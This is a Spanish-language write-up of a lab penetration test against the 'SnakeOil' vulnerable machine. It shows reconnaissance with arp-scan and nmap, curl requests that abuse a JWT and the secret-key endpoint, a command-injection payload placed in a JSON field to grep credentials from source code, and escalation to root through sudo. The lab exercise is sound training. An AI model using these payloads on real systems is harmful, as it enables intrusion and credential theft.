Auditoría de Seguridad: Servidor SnakeOil

Explotación de vulnerabilidades lógicas, evasión de filtros y escalada de privilegios en entorno Linux.

Introducción

Este proyecto documenta un ejercicio completo de pruebas de penetración (pentesting) sobre un servidor vulnerable configurado en un entorno de laboratorio aislado (VirtualBox). El objetivo principal fue mapear la superficie de ataque, evadir los mecanismos de defensa de la aplicación web y obtener acceso administrativo total (root). La auditoría demuestra cómo las malas configuraciones lógicas y de permisos superan a menudo a la criptografía robusta, requiriendo un enfoque analítico para pivotar entre diferentes vectores de ataque.

Recursos Tecnológicos

  • Entorno de virtualización: Oracle VirtualBox (Red NAT aislada).
  • Máquina atacante: Kali Linux (ajustada a 4GB de RAM para cargas criptográficas).
  • Máquina objetivo: Imagen "SnakeOil" (Basada en Debian).
  • Herramientas clave: arp-scan, Nmap, Gobuster, cURL, SSH.

Metodología y Comandos Ejecutados

A continuación se detalla la ruta crítica de explotación que llevó al compromiso del sistema, omitiendo los callejones sin salida para centrarse en los vectores efectivos.

kali@atacante:~

Fase 1: Reconocimiento

// Descubrir la IP de la máquina víctima (10.0.2.15) dentro de la red usando ARP.

$ sudo arp-scan -I eth0 --localnet

// Escaneo sigiloso y rápido de los 65,535 puertos.

$ sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.0.2.15

Fase 2: Interacción con la API (Acceso Inicial)

// Registro de usuario válido mediante API para capturar un JWT fresco.

$ curl -i -X POST -d "username=hacker2" -d "password=hacker123" http://10.0.2.15:8080/registration

// Bypass de autenticación inyectando el token como cookie para obtener la llave secreta.

$ curl -i http://10.0.2.15:8080/secret --cookie "access_token_cookie=TU_TOKEN"

Fase 3: Evasión y Ejecución Remota de Comandos (RCE)

// SSRF para inyectar comandos bash y extraer credenciales evadiendo filtros.

$ curl -s -X POST http://10.0.2.15:8080/run -H 'Content-Type: application/json' -d '{"secret_key":"commandexecutionissecret","url":"$(grep -i passw /home/patrick/flask_blog/app.py)"}'

Fase 4: Escalada a Root

// Conexión persistente evadiendo la aplicación web.

$ ssh patrick@10.0.2.15

// Enumeración de privilegios locales (reveló vulnerabilidad (ALL : ALL) ALL).

$ sudo -l

// Ejecución de shell como superusuario y obtención de bandera.

$ sudo su

Conclusión

Este ejercicio evidenció que la seguridad de un sistema no depende únicamente de la robustez de sus algoritmos criptográficos, sino de la correcta implementación de su arquitectura lógica. La intrusión se logró encadenando vulnerabilidades sutiles: el transporte inseguro de un JWT, un SSRF que permitió ejecución de comandos, y finalmente, una violación al principio de menor privilegio en el sistema operativo. La capacidad de adaptar la estrategia ofensiva —pasando de la fuerza bruta a la extracción quirúrgica de código fuente— fue determinante para comprometer exitosamente el objetivo.
